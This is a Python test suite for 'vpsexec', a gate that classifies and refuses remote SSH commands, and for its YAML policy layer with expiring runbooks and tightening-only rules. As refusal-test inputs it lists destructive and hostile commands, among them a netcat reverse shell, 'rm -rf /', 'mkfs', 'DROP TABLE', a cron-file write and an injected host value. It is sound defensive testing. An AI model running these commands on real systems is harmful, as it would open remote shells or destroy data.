"""vpsexec tests — the third door, and its YAML policy framework.

Hermetic: ssh, docker ps, ~/.ssh/config, the journal and the telemetry antenna
are all injected or redirected, so nothing here can reach a fleet host or write
the real journal.

The tests that matter most are the ones proving a REFUSAL. A gate with only
happy-path tests is a gate nobody has checked is load-bearing:

  FloorIsAbsoluteTest   — no input, flag, policy file or runbook reaches tier 1
  PolicyTighteningTest  — the YAML layer can add rules, never remove them
  BreakGlassTest        — elevation needs a runbook written BEFORE the incident
  ApprovalTest          — no TTY and no matching plan-hash => nothing runs
  PlanHashTest          — a changed fleet invalidates a previously-issued hash
"""
import contextlib
import hashlib
import io
import importlib.util
import json
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from vpscfg import (blackout, journal, probe, telemetry, vpsexec,  # noqa: E402
                    vpsexecgrant, vpsexeclog, vpsexecpolicy)
from vpscfg.control import Guard  # noqa: E402
from vpscfg.gates import DENY_ALWAYS_FLOOR, Refused  # noqa: E402

DENY = list(DENY_ALWAYS_FLOOR)

# The credential paths the secret-path tests run against: the deny_extra list
# an estate keeps in policies/secrets.yaml. tests/estate/ pins the shipped
# file's list equal to this one.
SECRETS_POLICY = REPO / "tests" / "data" / "secrets-policy"


def _policy(mode="test", mutation=True, postures=None, verbs=None):
    """The JSON governor — postures, floor, master switch."""
    return {
        "version": 1,
        "mode": mode,
        "mutation_enabled": mutation,
        "allowed_verbs": verbs if verbs is not None
        else ["show", "status", "deploy", "exec"],
        "scopes": {"unlocked": [], "tested": []},
        "hosts": postures if postures is not None else {
            "edge1": {"posture": "test"},
            "web3": {"posture": "released"},
            "web1": {"posture": "frozen"},
            "web2": {"posture": "lockdown"},
            "dns1": {"posture": "frozen"},
            "dns2": {"posture": "frozen"},
        },
        "deny_always": list(DENY_ALWAYS_FLOOR),
        "limits": {"command_timeout_sec": 120, "max_parallel_hosts": 5},
    }


def _policy_aliased():
    """A governor where `web1` is declared an alias of web1.example.internal: one
    machine reachable by two names, as a real estate's governor declares it."""
    pol = _policy()
    pol["hosts"]["web1.example.internal"] = {"posture": "frozen"}
    pol["hosts"]["web1"] = {"posture": "frozen",
                            "alias_of": "web1.example.internal"}
    return pol


def _yaml_policy(groups=None, runbooks=None, deny_extra=None, risky_extra=None):
    """The YAML layer — groups, runbooks, tightening."""
    return {"groups": groups or {}, "runbooks": runbooks or [],
            "deny_extra": deny_extra or [], "risky_extra": risky_extra or [],
            "files": []}


def _runbook(hosts, cmd, break_glass=False, where="host", source="test.yaml"):
    return {"hosts": list(hosts), "cmd": cmd, "where": where, "why": "test",
            "break_glass": break_glass, "source": source, "expires": "2999-01-01"}


def _guard(policy=None, verified=True):
    policy = policy or _policy()
    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
        json.dump(policy, f)
        path = f.name
    token = hashlib.sha256(Path(path).read_bytes()).hexdigest() if verified else None
    return Guard.load(path=path, token=token)


def _write(body, suffix=".yml"):
    f = tempfile.NamedTemporaryFile("w", suffix=suffix, delete=False)
    f.write(body)
    f.close()
    return f.name


class _Harness(unittest.TestCase):
    """Redirects the journal, silences telemetry, fakes ~/.ssh/config."""

    ALIASES = ("edge1", "web3", "web1", "web2", "dns1", "dns2")

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self._real_dir = journal.JOURNAL_DIR
        self._real_push = telemetry.push_event
        self._real_load = vpsexec.sshconfig.load
        self._real_machines = vpsexec.sshconfig.machines
        journal.JOURNAL_DIR = Path(self.tmp.name)
        # A break-glass plan with no contract flag searches the grants dir for
        # one to auto-pick: never the operator's real ~/.vpscfg/grants.
        self._real_grants = (vpsexecgrant.GRANT_DIR, vpsexecgrant.KEY_PATH)
        vpsexecgrant.GRANT_DIR = Path(self.tmp.name) / "no-grants" / "grants"
        vpsexecgrant.KEY_PATH = Path(self.tmp.name) / "no-grants" / "grant.key"
        telemetry.push_event = lambda *a, **k: False
        vpsexec.sshconfig.load = lambda *a, **k: dict((h, {}) for h in self.ALIASES)
        vpsexec.sshconfig.machines = lambda *a, **k: dict(
            (h, {"aliases": [h], "user": None}) for h in self.ALIASES)
        self.ssh_calls = []
        self._lock = threading.Lock()

    def tearDown(self):
        journal.JOURNAL_DIR = self._real_dir
        vpsexecgrant.GRANT_DIR, vpsexecgrant.KEY_PATH = self._real_grants
        telemetry.push_event = self._real_push
        vpsexec.sshconfig.load = self._real_load
        vpsexec.sshconfig.machines = self._real_machines
        self.tmp.cleanup()

    def fake_ssh(self, rcs=None, out="ok", err=""):
        rcs = rcs or {}
        def _ssh(host, cmd, timeout=None, connect_timeout=None):
            with self._lock:
                self.ssh_calls.append((host, cmd))
            if "vpscfg.lock" in cmd:
                return 0, "", ""
            return rcs.get(host, 0), out, err
        return _ssh

    def blackout_runner(self, active=None, unavailable=False, broken=False):
        def _run(argv, timeout=None):
            if unavailable:
                raise OSError("no blackout binary")
            if broken:
                return 0, "not json at all", ""
            return 0, json.dumps([{"host": h} for h in (active or [])]), ""
        return _run

    def prober(self, names=("shop-frontend", "shop-api", "blog-web")):
        def _probe(host, what):
            return {"host": host, "probe": what, "rc": 0,
                    "stdout": "".join("%s\timg\tUp\n" % n for n in names),
                    "stderr": ""}
        return _probe

    def cmds(self, host=None):
        return [c for h, c in self.ssh_calls
                if "vpscfg.lock" not in c and (host is None or h == host)]

    def events(self):
        p = Path(self.tmp.name) / "vpsexec.jsonl"
        if not p.exists():
            return []
        return [json.loads(l) for l in p.read_text().splitlines()]


# ===========================================================================
# the floor
# ===========================================================================

class FloorSyncTest(unittest.TestCase):
    def test_all_three_doors_carry_the_identical_floor(self):
        floors = {"gates": sorted(DENY_ALWAYS_FLOOR)}
        for name, rel in (("wrapper", "vpscfg-control.py"), ("vpsexec", "vpsexec")):
            spec = importlib.util.spec_from_loader(
                name, importlib.machinery.SourceFileLoader(name, str(REPO / rel)))
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            floors[name] = sorted(mod.DENY_ALWAYS_FLOOR)
        self.assertEqual(floors["gates"], floors["wrapper"])
        self.assertEqual(floors["gates"], floors["vpsexec"])


class FloorIsAbsoluteTest(unittest.TestCase):
    def test_every_floor_pattern_is_refused(self):
        for pattern in DENY_ALWAYS_FLOOR:
            with self.assertRaises(Refused, msg=pattern):
                vpsexec.classify("sudo %s now" % pattern, DENY)

    def test_whitespace_and_case_evasion_still_hits_the_floor(self):
        for evasion in ("DOCKER   VOLUME    PRUNE", "docker\tvolume\tprune",
                        "Docker Volume Prune -f", "rm   -rf   /"):
            with self.assertRaises(Refused, msg=evasion):
                vpsexec.classify(evasion, DENY)

    def test_floor_hidden_behind_a_benign_head_is_refused(self):
        for hidden in ("ls /opt && docker volume prune",
                       "uptime; docker system prune -af",
                       "echo hi | xargs docker volume rm"):
            with self.assertRaises(Refused, msg=hidden):
                vpsexec.classify(hidden, DENY)

    def test_absolute_path_rm_rf_is_floor_not_merely_risky(self):
        """CLAUDE.md rule 3 bans rm -rf outside a contract's deploy_dir.
        vpsexec has no contract, so every absolute rm -rf is tier 1."""
        for absolute in ("rm -rf /opt/scratch", "rm -rf /srv/app/dist", "rm -rf /"):
            with self.assertRaises(Refused, msg=absolute):
                vpsexec.classify(absolute, DENY)
        self.assertEqual(vpsexec.classify("rm -rf ./build", DENY)[0], "risky")

    def test_substitution_is_refused_outright_not_scanned(self):
        for evil in ("docker volume $(echo pr)une", "docker volume `echo prune`",
                     "cat <(echo hi)", "sh >(cat)"):
            with self.assertRaises(Refused, msg=evil):
                vpsexec.classify(evil, DENY)

    def test_no_risky_entry_is_dead_weight(self):
        for r in vpsexec.VPSEXEC_RISKY:
            for f in DENY_ALWAYS_FLOOR:
                self.assertNotIn(f.lower(), r.lower(),
                                 "risky %r is shadowed by floor %r" % (r, f))


class ClassifyTest(unittest.TestCase):
    def test_reads_classify_as_read(self):
        for cmd in ("ls -la /opt", "df -h", "docker ps", "systemctl status nginx",
                    "journalctl -u nginx -n 50", "cat /etc/hostname",
                    "k3s kubectl get pods -A", "nginx -t", "uptime"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_risky_commands_classify_as_risky(self):
        for cmd in ("systemctl restart n8n", "docker rm oldbox", "reboot",
                    "rm -rf ./build", "chown -R app:app /srv", "iptables -F",
                    "useradd bob", "kill -9 1234", "apt-get purge nginx",
                    "docker compose up -d", "docker exec x sh"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "risky", cmd)

    def test_unknown_commands_are_mutations_not_reads(self):
        for cmd in ("./deploy.sh", "make install", "npm run build",
                    "sed -i s/a/b/ f", "awk '{print}' f", "tar xzf a.tgz",
                    "python3 script.py", "unknown-binary --go"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "mutating", cmd)

    def test_openssl_certificate_checks_are_reads(self):
        """A post-condition needs to prove what a listener SERVES. x509 and
        s_client only ever print; the writing forms carry -out."""
        for cmd in ("openssl x509 -noout -checkend 1209600 -in /opt/smtp-relay/certs/server.crt",
                    "openssl s_client -connect 127.0.0.1:587 -starttls smtp < /dev/null 2>/dev/null"
                    " | openssl x509 -noout -enddate",
                    "openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt /opt/x/server.crt"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)
        for cmd in ("openssl x509 -in a.crt -out b.crt",
                    "openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem",
                    "openssl s_client -connect h:443 -out /tmp/x",
                    # s_client can write a session cache and, on 1.1.1, the TLS
                    # master secrets; x509 can create a serial file. All writes.
                    "openssl s_client -connect h:443 -sess_out /tmp/s",
                    "openssl s_client -connect h:443 -keylogfile /tmp/k",
                    "openssl x509 -in a.crt -CA ca.crt -CAkey ca.key -CAcreateserial"):
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_prefixed_read_with_writing_flag_is_not_a_read(self):
        """READ_ONLY_PREFIXES used to return before the disqualifier check,
        so `git diff --output=FILE` passed as a read. It writes a file."""
        for cmd in ("git diff --output=/tmp/x", "git diff --output /tmp/x",
                    "docker inspect x --format '{{.Id}}' > /tmp/x"):
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_read_head_with_writing_flag_is_not_a_read(self):
        for cmd in ("find /opt -name x -delete", "curl -o /etc/motd http://x",
                    "wget -O /tmp/x http://x", "nc -e /bin/sh 10.0.0.1 4444"):
            self.assertNotEqual(vpsexec.classify(cmd, DENY)[0], "read", cmd)

    def test_redirection_and_expansion_are_never_reads(self):
        for cmd in ("echo pwned > /etc/cron.d/x", "cat /etc/passwd >> /tmp/x"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "mutating", cmd)
        for cmd in ('echo $HOME', 'ls ${HOME}'):
            with self.assertRaises(Refused):
                vpsexec.classify(cmd, DENY)

    def test_read_chained_with_risky_takes_the_worse_tier(self):
        self.assertEqual(vpsexec.classify("ls /opt && systemctl stop nginx", DENY)[0],
                         "risky")

    def test_empty_command_refused(self):
        with self.assertRaises(Refused):
            vpsexec.classify("   ", DENY)


class SegmentSplitTest(unittest.TestCase):
    def test_splits_on_operators(self):
        self.assertEqual(vpsexec.split_segments("a && b || c ; d | e"),
                         ["a", "b", "c", "d", "e"])

    def test_does_not_split_inside_quotes(self):
        self.assertEqual(vpsexec.split_segments("grep 'a && b' f"),
                         ["grep 'a && b' f"])
        self.assertEqual(vpsexec.split_segments('echo "x; y"'), ['echo "x; y"'])


# ===========================================================================
# the YAML policy framework
# ===========================================================================

@unittest.skipUnless(vpsexecpolicy._HAVE_YAML, "PyYAML unavailable")
class PolicyLoadTest(unittest.TestCase):
    GOV = {"edge1", "web1", "web2", "web3", "dns1", "dns2"}

    def _dir(self, **files):
        d = tempfile.mkdtemp()
        for name, body in files.items():
            Path(d, name).write_text(body)
        return d

    def _load(self, **files):
        return vpsexecpolicy.load(self._dir(**files), deny_patterns=DENY,
                                  today="2026-08-27", governor_hosts=self.GOV,
                                  host_re=probe.HOST_RE)

    def test_missing_directory_is_not_an_error(self):
        pol = vpsexecpolicy.load("/nonexistent/policies", deny_patterns=DENY)
        self.assertEqual(pol["groups"], {})
        self.assertEqual(pol["runbooks"], [])

    def test_groups_load_and_grant_nothing(self):
        pol = self._load(**{"g.yaml": 'version: 1\nreason: "r"\n'
                                      'groups:\n  web: [web1, web3]\n'})
        self.assertEqual(pol["groups"]["web"], ["web1", "web3"])
        self.assertEqual(pol["runbooks"], [])

    def test_group_naming_an_unknown_host_refused(self):
        with self.assertRaises(Refused) as cm:
            self._load(**{"g.yaml": 'version: 1\nreason: "r"\n'
                                    'groups:\n  web: [web1, ghostbox]\n'})
        self.assertIn("governor does not know", str(cm.exception))

    def test_reserved_group_all_refused(self):
        with self.assertRaises(Refused) as cm:
            self._load(**{"g.yaml": 'version: 1\nreason: "r"\n'
                                    'groups:\n  all: [web1]\n'})
        self.assertIn("reserved", str(cm.exception))

    def test_duplicate_group_across_files_refused(self):
        with self.assertRaises(Refused) as cm:
            self._load(**{"a.yaml": 'version: 1\nreason: "r"\ngroups:\n  web: [web1]\n',
                          "b.yaml": 'version: 1\nreason: "r"\ngroups:\n  web: [web3]\n'})
        self.assertIn("defined in both", str(cm.exception))

    def test_unknown_top_level_key_is_refused_not_ignored(self):
        """A hopeful `allow_floor:` must fail loudly, and an older reader must
        never silently skip a key a newer file relies on."""
        for key in ("allow_floor", "deny_remove", "postures", "read_extra"):
            with self.assertRaises(Refused, msg=key) as cm:
                self._load(**{"g.yaml": 'version: 1\nreason: "r"\n%s: [x]\n' % key})
            self.assertIn("unknown top-level key", str(cm.exception))

    def test_runbooks_require_an_expiry(self):
        with self.assertRaises(Refused) as cm:
            self._load(**{"r.yaml": 'version: 1\nreason: "r"\nrunbooks:\n'
                                    '  - hosts: [edge1]\n    cmd: "systemctl restart x"\n'
                                    '    why: "w"\n'})
        self.assertIn("no 'expires'", str(cm.exception))

    def test_groups_only_file_needs_no_expiry(self):
        pol = self._load(**{"g.yaml": 'version: 1\nreason: "r"\ngroups:\n  web: [web1]\n'})
        self.assertEqual(pol["files"][0]["expires"], None)

    # An expired file used to refuse the WHOLE load, which took every read and
    # every other runbook down with it. Now it
    # grants nothing and everything else keeps working.
    _LAPSED = ('version: 1\nreason: "r"\nexpires: "2020-01-01"\n'
               'shape: {steps: 1, hosts: [edge1], break_glass: true}\n'
               'runbooks:\n  - hosts: [edge1]\n'
               '    cmd: "systemctl restart x"\n    why: "w"\n    break_glass: true\n')
    _LIVE = ('version: 1\nreason: "r"\nexpires: "2999-01-01"\n'
             'shape: {steps: 1, hosts: [web3], break_glass: false}\n'
             'runbooks:\n  - hosts: [web3]\n'
             '    cmd: "systemctl restart y"\n    why: "w"\n')

    def test_expired_policy_grants_nothing(self):
        pol = self._load(**{"old.yaml": self._LAPSED})
        self.assertEqual(pol["runbooks"], [])
        self.assertEqual([(Path(e["path"]).name, e["expires"], e["runbooks"])
                          for e in pol["expired"]], [("old.yaml", "2020-01-01", 1)])
        self.assertTrue(pol["files"][0]["lapsed"])

    def test_expired_policy_does_not_disarm_the_others(self):
        pol = self._load(**{"old.yaml": self._LAPSED, "new.yaml": self._LIVE})
        self.assertEqual([r["cmd"] for r in pol["runbooks"]], ["systemctl restart y"])
        self.assertEqual([r["source"] for r in pol["runbooks"]], ["new.yaml"])

    def test_policy_lapses_the_day_after_its_expiry(self):
        body = self._LAPSED.replace("2020-01-01", "2026-08-27")
        self.assertEqual(len(self._load(**{"r.yaml": body})["runbooks"]), 1)
        body = self._LAPSED.replace("2020-01-01", "2026-08-26")
        self.assertEqual(self._load(**{"r.yaml": body})["runbooks"], [])

    def test_expired_policy_still_tightens(self):
        """Dropping a lapsed file's deny_extra would LOOSEN the door."""
        pol = self._load(**{"old.yaml": self._LAPSED + 'deny_extra:\n  - "systemctl stop postgres"\n'
                                                       'risky_extra:\n  - "certbot"\n'})
        self.assertIn("systemctl stop postgres", pol["deny_extra"])
        self.assertIn("certbot", pol["risky_extra"])

    def test_expired_policy_is_still_validated_in_full(self):
        """Lapsing is not a way round review: a tampered or malformed expired
        file still refuses the whole load."""
        for body, why in (
                (self._LAPSED.replace("systemctl restart x", "docker volume prune"), "tampered"),
                (self._LAPSED + "allow_floor: true\n", "unknown top-level"),
                (self._LAPSED.replace("[edge1]", "[nosuchhost]"), "nosuchhost")):
            with self.assertRaises(Refused, msg=why) as cm:
                self._load(**{"r.yaml": body})
            self.assertIn(why, str(cm.exception))

    def test_expiry_notes_warn_on_lapsed_and_soon(self):
        pol = self._load(**{"old.yaml": self._LAPSED,
                            "soon.yaml": self._LIVE.replace("2999-01-01", "2026-08-29"),
                            "far.yaml": self._LIVE.replace("2999-01-01", "2026-09-30")
                                                  .replace("restart y", "restart z")})
        notes = vpsexecpolicy.expiry_notes(pol, today="2026-08-27")
        self.assertEqual(len(notes), 2, notes)
        self.assertIn("old.yaml expired on 2020-01-01", notes[0])
        self.assertIn("DISARMED", notes[0])
        self.assertIn("soon.yaml expires 2026-08-29", notes[1])

    def test_rollback_field(self):
        base = self._LIVE
        self.assertFalse(self._load(**{"r.yaml": base})["runbooks"][0]["rollback"])
        self.assertTrue(self._load(**{"r.yaml": base + "    rollback: true\n"})
                        ["runbooks"][0]["rollback"])
        # the older spelling in the why still counts
        marked = base.replace('why: "w"', 'why: "R1 (rollback only): undo"')
        self.assertTrue(self._load(**{"r.yaml": marked})["runbooks"][0]["rollback"])
        for bad, why in ((base + "    rollback: yes please\n", "true or false"),
                         (marked + "    rollback: false\n", "say which it is")):
            with self.assertRaises(Refused, msg=why) as cm:
                self._load(**{"r.yaml": bad})
            self.assertIn(why, str(cm.exception))

    def test_expires_must_be_zero_padded(self):
        """'2026-9-1' > '2026-10-08' as strings: it would stay armed for months."""
        for bad in ("2026-9-1", "2026-09-1", "2026-13-01", "2026-02-30", "26-09-01"):
            with self.assertRaises(Refused, msg=bad) as cm:
                self._load(**{"r.yaml": self._LIVE.replace("2999-01-01", bad)})
            self.assertIn("not YYYY-MM-DD", str(cm.exception))

    def test_lapsed_tightening_only_file_is_not_reported_as_disarmed(self):
        pol = self._load(**{"t.yaml": 'version: 1\nreason: "r"\nexpires: "2020-01-01"\n'
                                      'deny_extra:\n  - "systemctl stop postgres"\n'})
        self.assertEqual(pol["expired"], [])
        self.assertIn("systemctl stop postgres", pol["deny_extra"])

    def test_expired_runbook_cannot_be_granted(self):
        pol = self._load(**{"old.yaml": self._LAPSED})
        with self.assertRaises(Refused) as cm:
            vpsexecgrant.find_runbook(pol, "old")
        self.assertIn("unexpired", str(cm.exception))

    # `shape:` records what review approved. A file whose runbooks no longer
    # match it was edited since: disarmed like a lapsed file, never merged.
    _SHAPED = ('version: 1\nreason: "r"\nexpires: "2999-01-01"\n'
               'shape: {steps: 2, hosts: [edge1, web3], break_glass: mixed}\n'
               'runbooks:\n'
               '  - hosts: [edge1]\n    cmd: "systemctl restart x"\n    why: "w"\n'
               '  - hosts: [web3]\n    cmd: "systemctl restart y"\n    why: "w"\n'
               '    break_glass: true\n')

    def test_matching_shape_arms_the_file(self):
        pol = self._load(**{"s.yaml": self._SHAPED})
        self.assertEqual(len(pol["runbooks"]), 2)
        self.assertEqual(pol["misshapen"], [])
        self.assertFalse(pol["files"][0]["misshapen"])
        # host order in the declaration does not matter; the set does
        body = self._SHAPED.replace("[edge1, web3]", "[web3, edge1]")
        self.assertEqual(len(self._load(**{"s.yaml": body})["runbooks"]), 2)

    def test_shape_mismatch_disarms_the_file(self):
        """One edit per field, each made AFTER the shape was written: a step
        added, a host changed, break-glass flipped. Every one disarms."""
        added = self._SHAPED + '  - hosts: [edge1]\n    cmd: "systemctl restart z"\n    why: "w"\n'
        cases = (
            (added, "steps: declared 2, loaded 3"),
            (self._SHAPED.replace("  - hosts: [edge1]", "  - hosts: [web1]"),
             "hosts: declared [edge1, web3], loaded [web1, web3]"),
            (self._SHAPED.replace("    break_glass: true\n", "    break_glass: false\n"),
             "break_glass: declared mixed, loaded false"),
            (self._SHAPED.replace("break_glass: mixed}", "break_glass: true}"),
             "break_glass: declared true, loaded mixed"))
        for body, reason in cases:
            pol = self._load(**{"s.yaml": body})
            self.assertEqual(pol["runbooks"], [], reason)
            self.assertEqual([(Path(m["path"]).name, m["reason"]) for m in pol["misshapen"]],
                             [("s.yaml", reason)])
            self.assertTrue(pol["files"][0]["misshapen"], reason)
            self.assertFalse(pol["files"][0]["lapsed"], reason)

    def test_shape_mismatch_names_every_differing_field(self):
        body = self._SHAPED.replace("{steps: 2, hosts: [edge1, web3], break_glass: mixed}",
                                    "{steps: 9, hosts: [edge1], break_glass: false}")
        reason = self._load(**{"s.yaml": body})["misshapen"][0]["reason"]
        self.assertEqual(reason, "steps: declared 9, loaded 2; hosts: declared [edge1], "
                                 "loaded [edge1, web3]; break_glass: declared false, loaded mixed")

    def test_malformed_shape_refuses_the_whole_load(self):
        good = "shape: {steps: 2, hosts: [edge1, web3], break_glass: mixed}"
        for shape, why in (
                ("shape: [2]", "must be a mapping"),
                ("shape:", "must be a mapping"),
                ("shape: {steps: 2, hosts: [edge1, web3], break_glass: mixed, allow: x}",
                 "unknown key"),
                ("shape: {steps: 2, hosts: [edge1, web3]}", "missing"),
                ("shape: {steps: '2', hosts: [edge1, web3], break_glass: mixed}", "whole number"),
                ("shape: {steps: true, hosts: [edge1, web3], break_glass: mixed}", "whole number"),
                ("shape: {steps: 0, hosts: [edge1, web3], break_glass: mixed}", "whole number"),
                ("shape: {steps: 2, hosts: edge1, break_glass: mixed}", "non-empty list"),
                ("shape: {steps: 2, hosts: [], break_glass: mixed}", "non-empty list"),
                ("shape: {steps: 2, hosts: [edge1, edge1], break_glass: mixed}", "twice"),
                ("shape: {steps: 2, hosts: ['edge1;id'], break_glass: mixed}", "invalid host"),
                ("shape: {steps: 2, hosts: [edge1, web3], break_glass: yes please}",
                 "true, false or mixed"),
                ("shape: {steps: 2, hosts: [edge1, web3], break_glass: 1}",
                 "true, false or mixed")):
            with self.assertRaises(Refused, msg=shape) as cm:
                self._load(**{"s.yaml": self._SHAPED.replace(good, shape)})
            self.assertIn(why, str(cm.exception), shape)

    def test_shape_without_runbooks_refuses(self):
        with self.assertRaises(Refused) as cm:
            self._load(**{"t.yaml": 'version: 1\nreason: "r"\n'
                                    'shape: {steps: 1, hosts: [edge1], break_glass: false}\n'
                                    'deny_extra:\n  - "systemctl stop postgres"\n'})
        self.assertIn("no runbooks", str(cm.exception))

    def test_misshapen_file_is_still_validated_in_full(self):
        """A shape mismatch is not a way round review: tamper, an unknown key
        or an unknown host in a misshapen file still refuses everything."""
        bad_shape = self._SHAPED.replace("steps: 2", "steps: 7")
        for body, why in (
                (bad_shape.replace("systemctl restart x", "docker volume prune"), "tampered"),
                (bad_shape + "allow_floor: true\n", "unknown top-level"),
                (bad_shape.replace("  - hosts: [edge1]", "  - hosts: [nosuchhost]"), "nosuchhost")):
            with self.assertRaises(Refused, msg=why) as cm:
                self._load(**{"s.yaml": body, "new.yaml": self._LIVE})
            self.assertIn(why, str(cm.exception))

    def test_misshapen_file_still_tightens(self):
        """Dropping a misshapen file's deny_extra would LOOSEN the door."""
        body = (self._SHAPED.replace("steps: 2", "steps: 7")
                + 'deny_extra:\n  - "systemctl stop postgres"\n'
                  'risky_extra:\n  - "certbot"\n'
                  'groups:\n  web: [web1, web3]\n')
        pol = self._load(**{"s.yaml": body})
        self.assertEqual(pol["runbooks"], [])
        self.assertIn("systemctl stop postgres", pol["deny_extra"])
        self.assertIn("certbot", pol["risky_extra"])
        self.assertEqual(pol["groups"]["web"], ["web1", "web3"])

    def test_misshapen_file_does_not_disarm_the_others(self):
        pol = self._load(**{"s.yaml": self._SHAPED.replace("steps: 2", "steps: 7"),
                            "new.yaml": self._LIVE,
                            "ok.yaml": self._SHAPED.replace("restart x", "restart q")
                                                   .replace("restart y", "restart r")})
        self.assertEqual(sorted((r["source"], r["cmd"]) for r in pol["runbooks"]),
                         [("new.yaml", "systemctl restart y"),
                          ("ok.yaml", "systemctl restart q"),
                          ("ok.yaml", "systemctl restart r")])
        self.assertEqual([Path(m["path"]).name for m in pol["misshapen"]], ["s.yaml"])

    def test_misshapen_runbook_cannot_be_granted(self):
        pol = self._load(**{"s.yaml": self._SHAPED.replace("steps: 2", "steps: 7"),
                            "ok.yaml": self._SHAPED.replace("restart x", "restart q")
                                                   .replace("restart y", "restart r")})
        with self.assertRaises(Refused) as cm:
            vpsexecgrant.find_runbook(pol, "s")
        self.assertIn("declared shape", str(cm.exception))
        self.assertEqual(Path(vpsexecgrant.find_runbook(pol, "ok")["path"]).name, "ok.yaml")

    def test_lapsed_and_misshapen_file_is_reported_as_both(self):
        body = self._SHAPED.replace("2999-01-01", "2020-01-01").replace("steps: 2", "steps: 7")
        pol = self._load(**{"s.yaml": body})
        self.assertEqual(pol["runbooks"], [])
        self.assertEqual(len(pol["expired"]), 1)
        self.assertEqual(len(pol["misshapen"]), 1)

    def test_expiry_notes_warn_on_misshapen(self):
        pol = self._load(**{"s.yaml": self._SHAPED.replace("steps: 2", "steps: 7"),
                            "new.yaml": self._LIVE})
        notes = vpsexecpolicy.expiry_notes(pol, today="2026-08-27")
        self.assertEqual(notes, [
            "WARNING: policy s.yaml does not match its declared shape (steps: declared "
            "7, loaded 2) — its 2 runbook(s) are DISARMED. Re-review it, then fix the "
            "shape or the runbooks in git."])

    def test_runbooks_without_a_shape_disarm_only_that_file(self):
        """Shape is required at run time: a granting file with none never had
        its review recorded. It disarms that file alone; the load goes on."""
        unshaped = self._SHAPED.replace(
            "shape: {steps: 2, hosts: [edge1, web3], break_glass: mixed}\n", "")
        self.assertNotIn("shape:", unshaped)
        pol = self._load(**{"s.yaml": unshaped + 'deny_extra:\n  - "systemctl stop postgres"\n',
                            "new.yaml": self._LIVE})
        self.assertEqual([r["source"] for r in pol["runbooks"]], ["new.yaml"])
        self.assertEqual([(Path(m["path"]).name, m["reason"], m["runbooks"])
                          for m in pol["misshapen"]], [("s.yaml", "no shape declared", 2)])
        self.assertIn("systemctl stop postgres", pol["deny_extra"])
        with self.assertRaises(Refused):
            vpsexecgrant.find_runbook(pol, "s")
        notes = vpsexecpolicy.expiry_notes(pol, today="2026-08-27")
        self.assertEqual(len(notes), 1, notes)
        self.assertIn("s.yaml does not match its declared shape (no shape declared)", notes[0])
        self.assertIn("DISARMED", notes[0])

    def test_tightening_only_file_needs_no_shape(self):
        pol = self._load(**{"t.yaml": 'version: 1\nreason: "r"\n'
                                      'deny_extra:\n  - "systemctl stop postgres"\n'})
        self.assertEqual(pol["misshapen"], [])

    def test_duplicate_yaml_keys_refuse_the_whole_load(self):
        """safe_load keeps the LAST of two equal keys: a second `expires:` or
        `shape:` lower down would silently replace the reviewed one."""
        shape = "shape: {steps: 2, hosts: [edge1, web3], break_glass: mixed}\n"
        for body, why in (
                (self._SHAPED + shape, "top-level shape"),
                (self._SHAPED.replace("break_glass: mixed}",
                                      "break_glass: mixed, steps: 2}"), "key inside shape"),
                (self._SHAPED + 'expires: "2999-12-31"\n', "expires"),
                (self._SHAPED.replace('    why: "w"\n    break_glass: true\n',
                                      '    why: "w"\n    break_glass: true\n'
                                      '    break_glass: false\n'), "key inside a runbook")):
            with self.assertRaises(Refused, msg=why) as cm:
                self._load(**{"s.yaml": body, "new.yaml": self._LIVE})
            self.assertIn("duplicate key", str(cm.exception), why)

    def test_runbook_naming_a_floor_pattern_rejects_the_whole_file(self):
        for pattern in ("docker volume prune", "rm -rf /", "DROP TABLE users",
                        "mkfs.ext4 /dev/sda1", "terraform destroy"):
            with self.assertRaises(Refused, msg=pattern) as cm:
                self._load(**{"r.yaml": 'version: 1\nreason: "r"\nexpires: "2999-01-01"\n'
                                        'runbooks:\n  - hosts: [edge1]\n'
                                        '    cmd: "%s"\n    why: "w"\n' % pattern})
            self.assertIn("tampered", str(cm.exception))

    def test_examples_directory_is_not_loaded(self):
        d = self._dir(**{"groups.yaml": 'version: 1\nreason: "g"\ngroups:\n  web: [web1]\n'})
        Path(d, "examples").mkdir()
        Path(d, "examples", "more.yaml").write_text(
            'version: 1\nreason: "g"\ngroups:\n  dns: [dns1, dns2]\n')
        pol = vpsexecpolicy.load(d, deny_patterns=DENY)
        loaded = [Path(f["path"]).parent.name for f in pol["files"]]
        self.assertTrue(loaded, "expected the top-level file to load")
        self.assertNotIn("examples", loaded)
        self.assertNotIn("dns", pol["groups"])


@unittest.skipUnless(vpsexecpolicy._HAVE_YAML, "PyYAML unavailable")
class PolicyTighteningTest(_Harness):
    """The YAML layer may add rules. It may never remove one."""

    def test_deny_extra_refuses_a_command_the_floor_allows(self):
        pol = _yaml_policy(deny_extra=["systemctl stop postgres"])
        with self.assertRaises(Refused):
            vpsexec.dispatch(["edge1", "systemctl stop postgres", "--run",
                              "--reason", "x"],
                             guard=_guard(), policy=pol, prober=self.prober(),
                             ssh=self.fake_ssh())
        self.assertEqual(self.cmds(), [])

    def test_risky_extra_promotes_a_mutating_command_to_risky(self):
        pol = _yaml_policy(risky_extra=["certbot"])
        self.assertEqual(vpsexec.classify("certbot renew", DENY)[0], "mutating")
        self.assertEqual(vpsexec.classify("certbot renew", DENY, ["certbot"])[0],
                         "risky")

    def test_policy_cannot_remove_a_floor_pattern(self):
        """There is no key for it, and the floor comes from the governor, not
        from here — so even a policy that tries is simply not consulted."""
        pol = _yaml_policy(deny_extra=[])
        with self.assertRaises(Refused):
            vpsexec.dispatch(["edge1", "docker volume prune", "--run", "--reason", "x"],
                             guard=_guard(), policy=pol, prober=self.prober(),
                             ssh=self.fake_ssh())
